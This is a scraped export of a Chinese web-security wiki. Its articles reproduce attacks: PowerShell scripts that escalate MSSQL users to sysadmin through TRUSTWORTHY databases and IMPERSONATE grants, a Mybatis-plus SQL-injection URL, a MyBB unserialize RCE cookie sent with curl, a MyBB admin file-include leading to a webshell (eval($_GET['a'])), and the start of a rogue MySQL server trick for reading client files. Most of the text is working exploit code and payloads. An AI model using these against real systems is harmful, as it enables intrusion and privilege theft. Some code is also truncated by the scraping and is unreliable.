$TableDatabases = New-Object System.Data.DataTable $TableDBOwner = New-Object System.Data.DataTable $CheckforSysadmin = New-Object System.Data.DataTable # ----------------------------------------------- # Check if user is already a sysadmin # ----------------------------------------------- $QueryElevate = \"select is_srvrolemember('sysadmin') as IsSysAdmin\" $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn) $results = $cmd.ExecuteReader() $IsSysAdmin.Load($results) $conn.Close() $IsSysAdmin | Select-Object -First 1 IsSysAdmin | foreach { $Checksysadmin = $_.IsSysAdmin if ($Checksysadmin -ne 0){ write-host \"[*] You're already a sysadmin - no escalation needed.\" -foreground \"green\" Break } } # ----------------------------------------------- # Get a list of trusted databases owned by a sysadmin # ----------------------------------------------- # Setup query to grab a list of accessible databases $QueryDatabases = \"SELECT d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'\" # User status write-host \"[*] Enumerating accessible trusted databases owned by sysadmins...\" # Query the databases and load the results into the TableDatabases data table object $conn.Open() $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn) $results = $cmd.ExecuteReader() $TableDatabases.Load($results) # Check if any accessible databases where found if ($TableDatabases.rows.count -eq 0){ write-host \"[*] No accessible databases found.\" -foreground \"red\" Break }else{ $DbCount = $TableDatabases.rows.count write-host \"[*] Found $DbCount trusted databases owned by a sysadmin.\" -foreground \"green\" } # ------------------------------------------------- # Check if current user has db_owner role in any of them # ------------------------------------------------- if ($TableDatabases.rows.count -ne 0){ write-host \"[*] Checking if $ConnectUser has the db_owner role in any of them...\" $TableDatabases | foreach { [string]$CurrentDatabase = $_.databasename # Setup query to grab a list of databases $QueryProcedures = \"use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user from [$CurrentDatabase].sys.database_role_members drm join [$CurrentDatabase].sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join [$CurrentDatabase].sys.database_principals mp on (drm.member_principal_id = mp.principal_id) where rp.name = 'db_owner' and mp.name = SYSTEM_USER\" # Query the databases and load the results into the TableDatabase data table object $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryProcedures,$conn) Try{ $results2 = $cmd.ExecuteReader() $TableDBOwner.Load($results2) } Catch {} } } # ------------------------------------------------- # Attempt to escalate privileges # ------------------------------------------------- # Get number database wwhere the user is db_owner $DbOwnerRoleCount = $TableDBOwner.rows.count if ($DbOwnerRoleCount -ne 0) { # Set db to be used for escalating privs # fix this $TableDBOwner | Select-Object db -first 1 | foreach { $ElevateOnDb = $_.db } # Add new user if provided if ($newuser -and $newPass){ $AddUser = \"CREATE LOGIN $newuser WITH PASSWORD = '$newPass'\" $UsertoElevate = $newuser $Message = \" create and\" }else{ $AddUser = \"\" $UsertoElevate = $ConnectUser $Message = \"\" } # Status user write-host \"[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases.\" -foreground \"green\" write-host \"[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database...\" # Set authentication type and create connection string for the targeted database if($SqlUser -and $SqlPass){ # SQL login $conn.Close() $conn.ConnectionString = \"Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;\" [string]$ConnectUser = $SqlUser }else{ # Trusted connection $conn.Close() $conn.ConnectionString = \"Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;\" $UserDomain = [Environment]::UserDomainName $Username = [Environment]::UserName $ConnectUser = \"$UserDomain\\$Username\" } # Create stored procedures to escalate privileges $conn.Open() $QueryElevate = \"CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS begin $AddUser EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin' end\" $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn) $results = $cmd.ExecuteReader() $conn.Close() # Execute stored procedures to escalate privileges $conn.Open() $QueryElevate = \"EXEC sp_elevate_me\" $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn) $results = $cmd.ExecuteReader() $conn.Close() # Remove stored procedure $conn.Open() $QueryElevate = \"drop proc sp_elevate_me\" $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn) $results = $cmd.ExecuteReader() $conn.Close() # Verify that privilege escalation works If (-Not ($newuser -and $newPass)){ $conn.Open() $QueryElevate = \"select is_srvrolemember('sysadmin') as IsSysAdmin\" $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn) $results = $cmd.ExecuteReader() $CheckforSysadmin.Load($results) $conn.Close() $CheckforSysadmin | Select-Object -First 1 IsSysAdmin | foreach { $Checksysadmin2 = $_.IsSysAdmin if ($Checksysadmin2 -ne 0){ write-host \"[*] Success! - $UsertoElevate is now a sysadmin.\" -foreground \"green\" }else{ write-host \"[*] Sorry, something failed, no sysadmin for you.\" -foreground \"red\" } } } }else{ write-host \"[*] Sorry, $ConnectUser doesn't have the db_owner role in any of the sysadmin databases.\" -foreground \"red\" } write-host \"[*] All done.\" } 首先我们先把sysadmin的权限取消掉，这里可以自行取消掉，但是要添加就会报错 Invoke-SqlServer-Escalate-DbOwner -SqlUser MyAppUser01 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA 成功提权！！ 参考链接 https://xz.aliyun.com/t/8188 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:03 "},"Web安全/Mssql/Mssql 模拟登录提权/Mssql 模拟登录提权.html":{"url":"Web安全/Mssql/Mssql 模拟登录提权/Mssql 模拟登录提权.html","title":"Mssql 模拟登录提权","keywords":"","body":"Mssql 模拟登录提权 0x01 前提 开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。 0x02 复现 1.sa用户登录创建4个用户 -- Create login 1 CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!'; -- Create login 2 CREATE LOGIN MyUser2 WITH PASSWORD = 'MyPassword!'; -- Create login 3 CREATE LOGIN MyUser3 WITH PASSWORD = 'MyPassword!'; -- Create login 4 CREATE LOGIN MyUser4 WITH PASSWORD = 'MyPassword!'; 2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa USE master; GRANT IMPERSONATE ON LOGIN::sa to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1]; GO 这里的GRANT IMPERSONATE ON LOGIN意思是授权MyUser1用户对sa,MyUser2,MyUser3用户登录权限，查看sqlserver的文档https://docs.microsoft.com/zh-cn/sql/t-sql/statements/grant-server-principal-permissions-transact-sql?view=sql-server-ver15 在SQL Server的安全模型中，模拟（IMPERSONATE ）权限的安全对象是User或Login，被授予者（Grantee ）有权限模拟指定用户，在其安全上下文执行特定的操作。例如，user1授予模拟user2的权限，当user2的安全上下文有足够的权限，而user1没有时，通过权限模拟，user1能够在user2的权限上下文中执行查询请求： GRANT IMPERSONATE ON USER:: user2 TO user1; 通过执行EXECUTE AS 命令模拟用户的权限，用户user1就运行在user2的安全上下文中，例如，user1在登陆数据库之后，模拟user2的权限： EXECUTE AS USER = 'user2'; 3.查找可以模拟登录的用户 默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用MyUser1用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 这里我们可以看到MyUser1用户可以模拟登录sa,MyUser2,MyUser2用户，接下来就是模拟登录sa来获取sysadmin权限了 4.模拟SQL Server用户登陆 -- 验证是否为sysadmin权限 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') -- 模拟sa登录 EXECUTE AS LOGIN = 'sa' -- 验证是否为sysadmin权限 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') 可以看到，第二个查询之后我们已经是sysadmin的权限了 我们再用查看登录用户来验证下 SELECT * FROM master.sys.sysusers WHERE islogin = 1 模拟sa登录之前 模拟sa登录之后 权限高了，可以看到更多的用户登录 5.回到原来的登录 REVERT SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') 这样我们又回到myuser1用户登录的会话了 0x03 工具化 当然这个也可以用powershell一键实现 poc Invoke-SqlServer-Escalate-ExecuteAs.psm1 function Invoke-SqlServer-Escalate-ExecuteAs { Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\\SQLEXPRESS [*] Attempting to Connect to SQLServer\\SQLEXPRESS as myappuser... [*] Connected. [*] Enumerating users that myappuser can impersonate... [*] 3 accounts can be impersonated: [*] - user2 [*] - superuser [*] - sa [*] Checking if any of are sysadmins... [*] - user2 - NOT sysadmin [*] - superuser - NOT sysadmin [*] - sa - sysadmin! [*] Attempting to add myappuser to the sysadmin role via impersonation... [*] Verifying that myappuser was added to the sysadmin role... [*] Success! - myappuser is now a sysadmin. [*] All done. .EXAMPLE Creating a new sysadmin as a user with permissions to impersonate the sa account. PS C:\\> Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\\SQLEXPRESS -NewUser eviladmin -NewPass MyPassword! [*] Attempting to Connect to SQLServer\\SQLEXPRESS as myappuser... [*] Connected. [*] Enumerating users that myappuser can impersonate... [*] 3 accounts can be impersonated: [*] - user2 [*] - superuser [*] - sa [*] Checking if any of are sysadmins... [*] - user2 - NOT sysadmin [*] - superuser - NOT sysadmin [*] - sa - sysadmin! [*] Attempting to create and add eviladmin to the sysadmin role via impersonation... [*] Verifying that eviladmin was added to the sysadmin role... [*] Success! - eviladmin is now a sysadmin. [*] All done. .LINK http://www.netspi.com http://msdn.microsoft.com/en-us/library/ms178640.aspx .NOTES Author: Scott Sutherland - 2014, NetSPI Version: Invoke-SqlServer-Escalate-ExecuteAs.psm1 v1.0 Comments: This should work on SQL Server 2005 and Above. .TODO fix double run bug fix alternative creds connection use #> [CmdletBinding()] Param( [Parameter(Mandatory=$false, HelpMessage='Set SQL Login username.')] [string]$SqlUser, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login password.')] [string]$SqlPass, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login username.')] [string]$NewUser, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login password.')] [string]$NewPass, [Parameter(Mandatory=$false, HelpMessage='Execute query under impersonated user context.')] [string]$Query, [Parameter(Mandatory=$true, HelpMessage='Set target SQL Server instance.')] [string]$SqlServerInstance ) # ----------------------------------------------- # Setup database connection string # ----------------------------------------------- # Create fun connection object $conn = New-Object System.Data.SqlClient.SqlConnection # Set authentication type and create connection string if($SqlUser){ # SQL login / alternative domain credentials Write-Output \"[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser...\" $conn.ConnectionString = \"Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;\" [string]$ConnectUser = $SqlUser }else{ # Trusted connection Write-Output \"[*] Attempting to authenticate to $SqlServerInstance as the current Windows user...\" $conn.ConnectionString = \"Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;\" $UserDomain = [Environment]::UserDomainName $Username = [Environment]::UserName $ConnectUser = \"$UserDomain\\$Username\" } # ----------------------------------------------- # Test database connection # ----------------------------------------------- try{ $conn.Open() Write-Host \"[*] Connected.\" -foreground \"green\" $conn.Close() }catch{ $ErrorMessage = $_.Exception.Message Write-Host \"[*] Connection failed\" -foreground \"red\" Write-Host \"[*] Error: $ErrorMessage\" -foreground \"red\" Break } # ----------------------------------------------- # Check if the user is already a sysadmin # ----------------------------------------------- # Open db connection $conn.Open() # Setup query $Query = \"select is_srvrolemember('sysadmin') as sysstatus\" # Execute query $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn) $results = $cmd.ExecuteReader() # Parse query results $TableIsSysAdmin = New-Object System.Data.DataTable $TableIsSysAdmin.Load($results) # Check if current user is a sysadmin $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach { $Checksysadmin = $_.sysstatus if ($Checksysadmin -ne 0){ Write-Host \"[*] You're already a sysadmin - no escalation needed.\" -foreground \"green\" Write-Host \"[*] All Done.\" Break } } # Close db connection $conn.Close() # ----------------------------------------------- # Get a list of the users that can be impersonated # ----------------------------------------------- # User status Write-Host \"[*] Enumerating a list of users that can be impersonated...\" # Open db connection $conn.Open() # Setup query $QueryDatabases = \"SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'\" # Execute query $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn) $results = $cmd.ExecuteReader() # Parse query results $TableImpUsers = New-Object System.Data.DataTable $TableImpUsers.Load($results) # Check if any users can be impersonated if ($TableImpUsers.rows.count -eq 0){ # Status user Write-Host \"[*] Sorry, the current user doesn't have permissions to impersonate anyone.\" -foreground \"red\" Write-Host \"[*] All done.\" break }else{ # Status user $ImpUserCount = $TableImpUsers.rows.count Write-Host \"[*] Found $ImpUserCount users that can be impersonated:\" # Display users $TableImpUsers | foreach{ $ImpUser = $_.name Write-Host \"[*] - $ImpUser\" } } # Close db connection $conn.Close() # ---------------------------------------------------------------- # Check if any of the users that can be impersonated are sysadmins # ---------------------------------------------------------------- if ($TableImpUsers.rows.count -ne 0){ # Status user Write-Host \"[*] Checking if any of them are sysadmins...\" # Setup data table to store list of sysadmins that can be impersonated $TableImpUserSysAdmins = New-Object System.Data.DataTable $TableImpUserSysAdmins.Columns.Add('name') | Out-Null $TableImpUsers | foreach { # Open db connection $conn.Open() # Setup query $ImpUser = $_.name $Query = \"select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status\" # Execute query $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn) $results = $cmd.ExecuteReader() # Parse query results $TableImpUserSysAdminsCheck = New-Object System.Data.DataTable $TableImpUserSysAdminsCheck.Load($results) $TableImpUserSysAdminsCheck | foreach{ $SysAdminStatus = $_.status } # Check if the impersonatable user is a sysadmin if ($SysAdminStatus -eq 0){ Write-Host \"[*] - $ImpUser - NOT sysadmin\" }else{ Write-Host \"[*] - $ImpUser - sysadmin!\" -foreground \"green\" # Add to data table $TableImpUserSysAdmins.Rows.Add($ImpUser) | Out-Null } # Clear check $TableImpUserSysAdminsCheck.Clear() # Close db connection $conn.Close() } } # ------------------------------------------------- # Attempt to escalate privileges # ------------------------------------------------- # Verify that a sysadmin user can be impersonated $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count if ($ImpUserSysadminsCount -ne 0) { # Open db connection $conn.Open() # Check if we are going to add a new sysadmin or elevate the current one for query if ($newuser -and $newPass){ $AddUser = \"CREATE LOGIN $newuser WITH PASSWORD = '$newPass'\" $UsertoElevate = $newuser $Message = \" create and\" }else{ $AddUser = \"\" $UsertoElevate = $ConnectUser $Message = \"\" } # Status user Write-Host \"[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation...\" # Get the sysadmin user that can be impersonated $TableImpUserSysAdmins | foreach { $ImpUser = $_.name } # Setup query $Query = \"EXECUTE AS Login = '$ImpUser'; $AddUser; EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin'; SELECT IS_SRVROLEMEMBER('sysadmin','$UsertoElevate') as status;\" # Execute query $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn) $results = $cmd.ExecuteReader() # Status user Write-Host \"[*] Verifying that $UsertoElevate was added to the sysadmin role...\" # Parse query results $TableVerify = New-Object System.Data.DataTable $TableVerify.Load($results) # Check if user is a sysadmin $TableVerify| Select-Object -First 1 status | foreach { $VerifySysadmin = $_.status if ($VerifySysadmin -eq 1){ Write-Host \"[*] Success - $UsertoElevate is now a sysadmin!\" -foreground \"green\" Write-Host \"[*] All Done.\" }else{ Write-Host \"[*] Failed - Something went wrong!.\" -foreground \"red\" Write-Host \"[*] All Done.\" } } # Close db connection $conn.Close() }else{ Write-Host \"[*] Sorry, the $ConnectUser account can't impersonate any sysadmins.\" -foreground \"red\" Write-Host \"[*] All done.\" } } Invoke-SqlServer-Escalate-ExecuteAs -SqlUser MyUser1 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA 总的来说，利用这个来提权也不算是漏洞，毕竟可能是运维人员想要的正常功能，然后被攻击者利用，达到提权sysadmin的目的。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:08 "},"Web安全/Mybatis-plus/Mybatis-plus存在SQL注入漏洞/Mybatis-plus存在SQL注入漏洞.html":{"url":"Web安全/Mybatis-plus/Mybatis-plus存在SQL注入漏洞/Mybatis-plus存在SQL注入漏洞.html","title":"Mybatis-plus存在SQL注入漏洞","keywords":"","body":"Mybatis-plus存在SQL注入漏洞 漏洞描述 MyBatis：一种操作数据库的框架，提供一种Mapper类，支持让你用java代码进行增删改查的数据库操作，省去了每次都要手写sql语句的麻烦。但是！有一个前提，你得先在xml中写好sql语句，很麻烦，于是有了Mybatis-plus. MyBatis-plus:国人团队苞米豆在Mybatis的基础上开发的框架，在Mybatis基础上扩展了许多功能，荣获了2018最受欢迎国产开源软件第5名 漏洞影响 Mybatis-plus FOFA Mybatis 漏洞复现 使用Idea打开项目，修改配置文件数据库地址、账户密码、导入SQL文件，或在Mybatis-plus官网自行搭建，运行项目，访问selectPage接口 使用报错注入payload： http://127.0.0.1:8081/user/selectPage?ascs=extractvalue(1,concat(char(126),md5(123)))&ascs=1 断点分析 进入Page实体中 255行断点，此处接收的是个List类型参数： 我们只发送一个ascs参数： ascs=extractvalue(1,concat(char(126),md5(123))) 可以看到ascs被以逗号分割成了3份，会导致后续SQL拼接的语句语法错误（URL编码结果一样）： 因为我们这里传入两个ascs参数（至于为什么会这样，推测是SpringMVC的设计）： ascs=extractvalue(1,concat(char(126),md5(123)))&ascs=1 再断点： 这里我们的payload就不会被分割了，两个参数成了List的两个元素。 查看Page分页拦截器 mybatis-plus-extension-3.4.2.jar!/com/baomidou/mybatisplus/extension/plugins/PaginationInterceptor.class 127行断点： SQL代码就是在此处拼接完成的，具体拼接流程是这两行： plainSelect.setOrderByElements(orderByElementsReturn); return plainSelect.toString(); orderByElementsReturn就是我们传入的payload数组，plainSelect是mybatis中的原始sql语句，此处先将orderByElementsReturn，set到plainSelect的属性中，之后重写了toString方法，跟入toString： 387行将payload加上ORDER BY字符串后append到原始sql中： orderByToString方法： 至此Payload就被拼接到了Mybatis原始SQL语句中。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:11 "},"Web安全/MyBB/MyBB = 1.8.3 rce漏洞/MyBB = 1.8.3 rce漏洞.html":{"url":"Web安全/MyBB/MyBB = 1.8.3 rce漏洞/MyBB = 1.8.3 rce漏洞.html","title":"MyBB = 1.8.3 rce漏洞","keywords":"","body":"MyBB\\ 一、漏洞简介 在使用精心编制的对象的__wakeup()魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。 二、漏洞影响 PHP 5.6 \\ MyBB\\ 三、复现过程 漏洞分析 gmp.c static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */ { ... ALLOC_INIT_ZVAL(zv_ptr); if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC) || Z_TYPE_P(zv_ptr) != IS_ARRAY ) { zend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC); goto exit; } if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) { zend_hash_copy( zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr), (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *) ); } zend_object_handlers.c ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ { zend_object *zobj; zobj = Z_OBJ_P(object); if (!zobj->properties) { rebuild_object_properties(zobj); } return zobj->properties; } 攻击者可以将**object更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过Z_OBJ_P访问存储在对象库中的任何对象。这意味着攻击者将能够通过zend_hash_copy()更新对象中的任何属性。从而引发了一系列安全问题。 下面这段代码可以验证这个漏洞 ryat = 1; } } $obj = new stdClass; $obj->aa = 1; $obj->bb = 2; $inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}'; $exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}'; $x = unserialize($exploit); var_dump($obj); ?> 预期结果: object(stdClass)#1 (2) { [\"aa\"]=> int(1) [\"bb\"]=> int(2) } 实际结果: object(stdClass)#1 (3) { [\"aa\"]=> string(2) \"hi\" [\"bb\"]=> string(2) \"hi\" [0]=> object(obj)#3 (1) { [\"ryat\"]=> &int(1) } } 漏洞利用 在php 5.6中，DateInterval的__wakeup()使用convert_to_long()句柄并重新分配其属性，因此攻击者可以通过GMP的gmp_cast_object()将GMP对象转换成任何整数类型的ZVAL: static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */ { mpz_ptr gmpnum; switch (type) { ... case IS_LONG: gmpnum = GET_GMP_FROM_ZVAL(readobj); INIT_PZVAL(writeobj); ZVAL_LONG(writeobj, mpz_get_si(gmpnum)); return SUCCESS; 漏洞利用代码 当然，也可以套用精心编制的__wakeup() ryat = (int) $this->ryat; } ?> MyBB \\ index.php if(isset($mybb->cookies['mybb']['forumread'])) { $forumsread = my_unserialize($mybb->cookies['mybb']['forumread']); } MyBB\\unserialize()反序列化cookie，因此攻击者能够更新$mybb或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等 好消息是该漏洞已经在新版本得到了修复 PoC MyBB \\ index.php eval('$index = \"'.$templates->get('index').'\";'); MyBB在模板解析过程中始终使用eval()函数。 inc/class_templates.php class templates { ... public $cache = array(); ... function get($title, $eslashes=1, $htmlcomments=1) { global $db, $theme, $mybb; ... $template = $this->cache[$title]; ... return $template; } 如果我们可以控制$cache，我们就可以通过eval()函数注入php代码。 inc/init.php $error_handler = new errorHandler(); ... $maintimer = new timer(); ... $mybb = new MyBB; ... switch($config['database']['type']) { case \"sqlite\": $db = new DB_SQLite; break; case \"pgsql\": $db = new DB_PgSQL; break; case \"mysqli\": $db = new DB_MySQLi; break; default: $db = new DB_MySQL; } ... $templates = new templates; $templates对象在init.php中实例化，并且在此之前实例化了四个对象。这意味着$templates对象的句柄被设置为5并存储到对象存储中，因此我们可以访问$templates对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新$cache属性。这也表明我们可以通过eval()函数注入php代码。 当MyBB\\ curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://0-sec.org/mybb Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:16 "},"Web安全/MyBB/MyBB 后台代码执行漏洞/MyBB 后台代码执行漏洞.html":{"url":"Web安全/MyBB/MyBB 后台代码执行漏洞/MyBB 后台代码执行漏洞.html","title":"MyBB 后台代码执行漏洞","keywords":"","body":"MyBB 后台代码执行漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 首先全局搜索inclued函数，在\\mybb\\admin\\modules\\config\\languages.php页面的432行发现include函数：\\@include $editfile; 该函数包含editfile文件，进行查看该文件来源，可以看到418行该文件由folder文件夹和file文件拼接，其中408行看到file文件由post请求提交，接下来查看folder文件夹来源 通过该文件84行看到foler文件夹为MYBB_ROOT.\"inc/languages/\".$editlang.\"/\"，接下来查看editlang变量，通过89行看到判断该文件名后缀为php的文件是否存在，然后查看该文件下辖的php文件只有english文件，猜测editlang为english，稍后验证，该变量会通过post请求输入 现在文件的目录结构分析完毕，接下来查看该漏洞页面的接口位置：由于该文件目录为\\mybb\\admin\\modules\\config\\languages.php，因此，入口为config模板的language方法中，其中控制器为edit，从369行可以看到，同时408行看到post请求中输入file文件 因此我们查看该页面uri大概为以下样子：/mybb/admin/index.php?module=config-languages&action=edit现在进行分析，该目录为inc/languages/english，因此我们需要向该文件夹下进行上传一个图片，因此我们需要将上传文件目录修改为该文件夹，现在分析如何修改该文件夹：通过对头像上传文件夹进行跟踪，发现在function_upload.php的222行，该文件夹由全局变量settings控制 对该变量进行跟踪，$mybb->settings['avataruploadpath']，发现对$mybb->settings[\\'uploadspath\\']变量的控制就需要对文件进行修改进行查询，针对关键函数进行搜索：$db->update_query(\"settings\"发现在\\mybb\\admin\\modules\\config\\settings.php文件下1101行： 通过value和name变量进行更新，其中value变量是从post请求中的upsetting数组中进行获取其name变量的值： 我们跟踪avataruploadpath变量，进行搜索，有1042行定义数组，而avataruploadpath为数组中的参数，同时也有post请求的upsetting数组进行输入: 现在寻找数据传入方式，发现action方法为change，请求方式为post： 通过该页面17行，发现页面在index页面下调用的模板为config下的setting模板： 因此我们构建的页面就可以为这样，从该页面进行传入数据 http://www.0-sec.org/mybb/admin/index.php?module=config-settings&action=change 漏洞复现 通过上传头像（上传的头像图片小于1kb，因为网站会进行压缩，将php脚本破坏，因此制作木马要保证大小小于1kb，已做好的图片放在了附件中）通过修改setting中的avataruploadpath值为./inc/languages/english 修改avataruploadpath值为./inc/languages/English，查看所有的settins变量：链接：http://www.0-sec.org/mybb/admin/index.php?module=config-settings&action=change 找到**Avatar Upload Path**并修改./inc/languages/english 通过上传头像图片：http://www.0-sec.org/mybb/admin/index.php?module=user-users&action=edit&uid=1\\#tab\\_avatar勾选去掉当前头像 点击save user发现文件已经上传成功，并且avataruploadpath也修改成功，下面进行包含操作，访问url：http://www.0-sec.org/mybb/admin/index.php?module=config-languages&action=edit&lang=englishConfig模块下的languages下， 因为该页面包含需要post请求，并且控制器入口为edit，因此我们进行edit，随便点一个php文件进行编辑： 什么都不用更改，点击save languagefile bp抓包： 将file变量改为我们的头像图片文件名，名字可以从这里看到 通过邮件查看图片链接：右键复制链接打开可以看到文件名为avatar_1.jpg 然后放包发现该代码执行成功，phpinfo() 测试一句话木马eval($_GET[\\'a\\']); 测试成功文件上传后，包含后图像文件会损坏，所以需要执行完命令，创建一个新的shell文件，然后通过poc进行验证shell文件存在写一句话木马到网站，请使用muma.jpg,然后包含，会在/mybb/admin生成shell.php,一句话木马密码为a 文中附件下载链接 http://wiki.0-sec.org/download/Mybb\\_pic.7z 参考链接 https://xz.aliyun.com/t/7213\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:19 "},"Web安全/Mysql/MySQL LOAD DATA 读取客户端任意文件/MySQL LOAD DATA 读取客户端任意文件.html":{"url":"Web安全/Mysql/MySQL LOAD DATA 读取客户端任意文件/MySQL LOAD DATA 读取客户端任意文件.html","title":"MySQL LOAD DATA 读取客户端任意文件","keywords":"","body":"MySQL LOAD DATA 读取客户端任意文件 一、漏洞简介 LOAD DATA INFILE mysql的LOAD DATA INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是： load data infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; load data local infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; 第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD DATA LOCAL INFILE。官方文档中也提出了这个问题（PS：Google翻译的不是很准确） 二、漏洞影响 三、复现过程 分析数据包 测试环境：MacOS 10.14Mysql 5.7.21 使用tcpdump抓取3306端口的数据包 1.服务器向客户端发送greeting问候包，包含服务端banner信息 2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。 3.然后是客户端初始化的一些查询，比如select database(); select @\\@version_comment; 4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que 5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。 6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容： 如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的 In theory, a patched server could be built that would tell the client program to transfer a file of the server\\'s choosing rather than the file named by the client in the LOAD DATA statement.也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 搭建MySQL服务端 主要分为 向 MySQL Client 发送Server Greeting 等待 Client 端发送一个Query Package 回复一个file transfer请求 我们需要知道如何构造File Transfer和Server Greeting数据包，这些包的格式都可以在 MySQL 的官方文档上找到。 File Transfer数据包格式：Protocol::LOCAL_INFILE_Request 